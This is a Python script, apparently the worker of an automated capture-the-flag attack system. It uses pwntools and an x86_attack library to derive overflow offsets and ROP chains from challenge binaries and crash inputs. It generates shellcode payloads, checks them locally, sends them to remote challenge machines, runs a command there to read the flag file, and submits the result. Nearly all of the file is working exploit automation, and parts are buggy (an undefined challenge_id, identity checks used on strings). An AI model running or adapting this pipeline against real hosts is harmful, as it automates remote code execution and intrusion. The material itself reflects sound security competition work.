# -*- coding: utf-8 -*-
import os
import sys
import logging
import tempfile
import subprocess
from pwn import *
from farnsworth.models import ChallengeSetFielding, IDSRuleFielding, Exploit, PovFuzzer1Job, PovTestResult, ChallengeBinaryNode
from playhouse.shortcuts import model_to_dict

from x86_attack.init import *
from x86_attack.roputils import *
from x86_attack.analyze import *
from x86_attack.shell_craft import *
from x86_attack.quick_mode import *
from x86_attack.cfl import *

import pov_fuzzing
import compilerex
#context.log_level="debug"
logging.basicConfig()
l = logging.getLogger("pov_fuzzing_type1")
l.setLevel("INFO")

#从环境变量得到job id
job_id = os.environ['JOB_ID']

#根据job id获得相应的job类
job = PovFuzzer1Job.find(job_id)
if job is None:
    raise Exception("Couldn't find job %d", job_id)
job.started()

#从关联job的cs_id获取题目二进制的路径，该路径在本地
cbnp = job.cs.cbns_original[0].path
print 'cbnp1111111111:',cbnp
#获取crash
if job.payload is not None:
    crash = job.input_crash
    crash_payload = str(crash.blob)
else:
    crash = None
    crash_payload = ""

#获取题的cs_id
cs_id = job.cs.id
l.info("pov_fuzzing_type for challenge %s", job.cs.name)

#获取题目类
challenge_node=ChallengeBinaryNode.get(ChallengeBinaryNode.cs_id==cs_id)

#获取题目ip
vm_ip=challenge_node.vm_ip

#获取题目端口
vm_port=challenge_node.vm_port

#获取题目题号
cbn_name=challenge_node.name
# whc
info = {}
lcs = {}
rop_and_index = {}
payload = []

global QUICK_MODE
QUICK_MODE = 1


global NORMAL_MODE
NORMAL_MODE = 1

global flag
flag = str()
global status
status=0

#通过固定模式产生一段字符串并填充模拟单次输入crash，以此快速求解可控字符的偏移
if QUICK_MODE:
    log.info('QUICK_MODE: ON')
    payload_part = quick_mode.getshell(cbnp)
    if payload_part == -1:
        QUICK_MODE = 0
    else:
        shell = shell_craft(cbnp, crash_payload, None, None)
        p1 = payload_part.split(',.,')[0]
        p2 = payload_part.split(',.,')[1]
        for _ in range(5):
            try:
                p = remote(vm_ip, vm_port ,timeout = 3)
                p.sendline(p1)
                p.recvn(1)
                p.sendline(p2)
                p.sendline('echo zxcv;cat /home/flag'+str(cbn_name)+'.txt;')
                p.recvuntil('zxcv\n')
                flag = p.recvuntil('}')
                print flag
                ChallengeBinaryNode.update(flag=flag).where(ChallengeBinaryNode.cs_id==cs_id).execute()
                p.close()
                QUICK_MODE = 1
                break
            except:
                shell.post_reset(challenge_id)
                sleep(3)

if flag is not "":
    for _ in range(5):
        try:
            status=shell.post_answer(flag)
            print 'quick status:  ',status
            if status == 1:
                break
            sleep(3)
        except:
            pass

#分段pattern字符模拟多次输入的crash，分析内存，求解偏移
if not QUICK_MODE and NORMAL_MODE:
    log.info('NORMAL_MODE : ON')
    i = init(cbnp, (Pattern.create(1000)+'\n')*5)
    info = i.get_state()
    if info == None:
        NORMAL_MODE = 0
    else:
        a = analyze(info, cbnp, (Pattern.create(1000)+'\n')*5)
        lcs = a.find_lcs()
        if lcs == -1:
            NORMAL_MODE = 0
        else:
            rop_and_index = a.calc_index()
            if rop_and_index == -1:
                NORMAL_MODE = 0
            else:
                shell = shell_craft(cbnp, (Pattern.create(1000)+'\n')*5, rop_and_index, info)
                payload = shell.create_payload()
                payload_useful = 0
                remote_payload = str()
                for i in payload:
                    try:
                        p = process(cbnp)
                        p.sendline(i)
                        p.sendline('echo zxcv;')
                        p.recvuntil('zxcv\n')
                        p.close()
                        payload_useful = 1
                        remote_payload = i
                        break
                    except:
                        p.close()
                        NORMAL_MODE = 0
                if payload_useful:
                    for _ in range(5):
                        try:
                            p = remote(vm_ip, vm_port, timeout=5)
                            p.sendline(remote_payload)
                            p.sendline('echo zxcv;cat /home/flag'+str(cbn_name)+'.txt;')
                            p.recvuntil('zxcv\n')
                            flag = p.recvuntil('}')
                            print flag
                            ChallengeBinaryNode.update(flag=flag).where(ChallengeBinaryNode.cs_id==cs_id).execute()
                            p.close()
                            QUICK_MODE = 1
                            NORMAL_MODE = 1
                            break
                        except:
                            NORMAL_MODE = 0
                            shell.post_reset(challenge_id)
                            sleep(3)

if flag is not "" and status == 0:
    for _ in range(5):
        try:
            status=shell.post_answer(flag)
            print 'normal status: ',status
            if status == 1:
                break
            sleep(3)
        except:
            pass

#用AFL的crash，创建二进制内存转储，分析内存，求解偏移
if not NORMAL_MODE:
    log.info('BRUTEFORCE_MODE : ON')
    if crash == '' and CFL:
        cfl_crash_list = []
        cfl_crash_list = cfl.run(cbnp)
        if len(cfl_crash_list) > 0:
            for cfl_crash in cfl_crash_list:
                crash_payload = cfl_crash
    i = init(cbnp, crash_payload)
    info = i.get_state()
    if info is not None:
        a = analyze(info, cbnp, crash_payload)
        lcs = a.find_lcs()
        if lcs is not -1:
            rop_and_index = a.calc_index()
            if rop_and_index is not -1:
                shell = shell_craft(cbnp, crash_payload, rop_and_index, info)
                payload = shell.create_payload()
                payload_useful = 0
                remote_payload = str()
                for i in payload:
                    try:
                        p = process(cbnp)
                        p.sendline(i)
                        p.sendline('echo zxcv;')
                        p.recvuntil('zxcv\n')
                        p.close()
                        payload_useful = 1
                        remote_payload = i
                        break
                    except:
                        p.close()
                if payload_useful:
                    for _ in range(5):
                        try:
                            p = remote(vm_ip, vm_port, timeout=5)
                            p.sendline(remote_payload)
                            p.sendline('echo zxcv;cat /home/flag'+str(cbn_name)+'.txt;')
                            p.recvuntil('zxcv\n')
                            flag = p.recvuntil('}')
                            print flag
                            ChallengeBinaryNode.update(flag=flag).where(ChallengeBinaryNode.cs_id==cs_id).execute()
                            p.close()
                            break
                        except:
                            shell.post_reset(challenge_id)
                            sleep(3)

if flag is not "" and status == 0:
    for _ in range(5):
        try:
            status=shell.post_answer(flag)
            print 'brut status: ',status
            if status == 1:
                break
            sleep(3)
        except:
            pass

job.completed()
job.produced_output = True
job.save()



